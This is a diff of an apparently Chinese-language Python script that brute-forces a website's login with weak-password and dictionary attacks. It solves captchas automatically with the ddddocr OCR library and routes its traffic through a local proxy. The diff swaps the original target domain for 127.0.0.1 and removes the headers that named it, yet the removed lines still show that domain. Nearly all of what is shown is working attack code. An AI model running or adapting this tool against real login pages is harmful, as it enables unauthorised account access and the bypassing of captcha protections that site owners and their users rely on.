@@ -7,7 +7,7 @@ import sys
 path = os.path.dirname(os.path.abspath(__file__))
 requests.packages.urllib3.disable_warnings()
 ocr = ddddocr.DdddOcr()
-proxies = {"http": "http://127.0.0.1:10809"}#代理
+proxies = {"http": "http://127.0.0.1:12345"}#代理
 print(f'''
 --------------------------
 main.py -r        #弱口令
@@ -15,7 +15,7 @@ main.py xxx.txt   #字典爆破
 默认使用的代理:{proxies}
 ''')
 # url="https://agent.dgs-zopqucm.com/agent/#/"
-url="https://agent.dgs-zopqucm.com/user/login"
+url="https://127.0.0.1/user/login"
 def userpassbp(result,file,ints): #爆破
     headersbp = {
         'Cookie': 'PHPSESSID=9cee9522237b174d1bb39e30be105cd5',
@@ -25,8 +25,6 @@ def userpassbp(result,file,ints): #爆破
         'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
         'Accept-Encoding': 'gzip, deflate',
         'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'https://agent.dgs-zopqucm.com',
-        'Referer': 'https://agent.dgs-zopqucm.com/agent/',
         'Sec-Fetch-Dest': 'document',
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-Site': 'none',
@@ -47,13 +45,13 @@ def userpassbp(result,file,ints): #爆破
     else:
         print('登录成功')
         exit()
-
+        
 
 def get_captcha():
     """
     获取验证码
     """
-    url = "https://agent.dgs-zopqucm.com/user/code?code=1680090673780"
+    url = "https://127.0.0.1/user/code?code=1680090673780"
 
     headersocr = {
         'Cookie': 'PHPSESSID=9cee9522237b174d1bb39e30be105cd5',
@@ -61,7 +59,6 @@ def get_captcha():
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
         'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
         'Accept-Encoding': 'gzip, deflate',
-        'Referer': 'https://agent.dgs-zopqucm.com/user/code?code=1680090673780',
         'Sec-Fetch-Dest': 'document',
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-Site': 'none',
